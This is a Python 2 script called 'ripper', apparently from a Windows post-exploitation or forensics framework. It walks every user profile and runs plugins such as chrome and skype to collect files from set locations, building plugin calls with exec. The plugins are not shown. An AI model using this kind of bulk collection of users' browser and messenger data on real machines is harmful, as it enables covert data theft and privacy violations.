
from ops.parseargs import ArgumentParser
import os.path
import sys
import ops.files.dirs
import ops.system.environment, ops.system.systemversion
import plugins
from plugins import *
__PLUGINS = list()
__MAXSIZE = 0
__COLLECTUSERS = list()

def hoover():
    global __PLUGINS, __MAXSIZE, __COLLECTUSERS
    sysver = ops.system.systemversion.get_os_version()
    userPath = ''
    pluginsToLoad = list()
    needUserDirs = False
    if (sysver.versioninfo.major == 6):
        userPath = os.path.split(ops.system.environment.get_environment_var('PUBLIC').value)[0]
    else:
        userPath = os.path.split(ops.system.environment.get_environment_var('ALLUSERSPROFILE').value)[0]
    for p in __PLUGINS:
        if (p not in plugins.__nouserdirs__):
            pluginsToLoad.append([p, True])
            needUserDirs = True
        else:
            pluginsToLoad.append([p, False])
    badUsers = ['.', '..', 'desktop.ini', 'All Users', 'LocalService', 'NetworkService']
    goodUsers = []
    if (needUserDirs == True):
        if (len(__COLLECTUSERS) > 0):
            goodUsers = __COLLECTUSERS
        else:
            userdirs = ops.files.dirs.get_dirlisting(userPath, recursive=False)
            for diritem in userdirs.diritem:
                for fileitem in diritem.fileitem:
                    if (fileitem.name not in badUsers):
                        goodUsers.append(('%s' % fileitem.fullpath))
    for p in pluginsToLoad:
        cmd = ('loadedPlugin = %s.%s(%s, %s)' % (p[0], p[0], sysver.versioninfo.major, __MAXSIZE))
        exec cmd
        if (p[1] == True):
            for goodUser in goodUsers:
                loadedPlugin.check(goodUser)
        else:
            loadedPlugin.check(None)
        loadedPlugin.preGet()
        loadedPlugin.get()
        loadedPlugin.postGet()

def example():
    print 'EXAMPLE:'
    print ''
    print 'ripper -p chrome,skype,unknowns -m 524288'
    print '  run the chrome, skype, and unknowns plugins, prompting to collect if files found are greater than 524288 bytes'

def listplugins():
    print 'the following plugins are registered'
    available = dir(plugins)
    for avail in available:
        if ((avail[0:2] == '__') or (avail == 'plugin')):
            pass
        else:
            print ('  ' + avail)

def parse_program_arguments(arguments):
    parser = ArgumentParser(prog='ripper', description='collects files from predetermined locations')
    parser.add_argument('-l', '--list', dest='list', help='list available plugins', action='store_true')
    parser.add_argument('-p', '--plugins', dest='plugins', help='plugins to run, comma separated')
    parser.add_argument('-m', '--maxsize', dest='maxsize', default=(256 * 1024), help='max file size to automatically get, in bytes')
    parser.add_argument('-u', '--users', dest='users', help='users to collect against, comma separated')
    options = parser.parse_args()
    if ((options.plugins == None) and (options.list != True)):
        parser.print_help()
        print ''
        example()
        print ''
        listplugins()
        return
    if (options.list == True):
        listplugins()
        return
    if options.plugins:
        global __PLUGINS
        for plugin in options.plugins.split(','):
            __PLUGINS.append(plugin)
    if options.maxsize:
        global __MAXSIZE
        __MAXSIZE = options.maxsize
    if options.users:
        global __COLLECTUSERS
        for user in options.users.split(','):
            __COLLECTUSERS.append(user)
if (__name__ == '__main__'):
    parse_program_arguments(sys.argv)
    hoover()